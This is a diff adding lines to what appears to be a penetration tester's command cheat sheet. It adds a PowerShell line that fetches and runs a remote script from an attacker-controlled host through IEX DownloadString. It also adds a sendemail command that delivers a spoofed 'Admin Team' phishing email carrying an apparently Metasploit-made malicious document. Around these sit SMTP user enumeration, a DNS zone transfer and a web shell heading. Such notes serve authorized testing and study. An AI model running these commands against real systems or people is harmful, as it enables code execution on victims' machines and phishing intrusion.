@@ -100,6 +100,7 @@ sort -u passwords | tee passwords
 
 ## File Transfer
 powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1''); dir C:\programdata\tmp"
+set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/tools.ps1');"
 
 ## Web
 [*] Web Shell
@@ -322,6 +323,15 @@ telnet --user $USERNAME $TARGET
 
 [*] (25) SMTP
 nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET
+
+sendemail \
+        -s $TARGET \
+        -f "Admin Team <admin@$DOM>" \
+        -t career@$DOM \
+        -o tls=no \
+        -u "Subject: Important Document" \
+        -m "This is the document you asked for. Thanks again" \
+        -a /home/consultant/.msf4/local/msf.odt
 
 [*] (53) DNS
 dig axfr @$TARGET $DOM
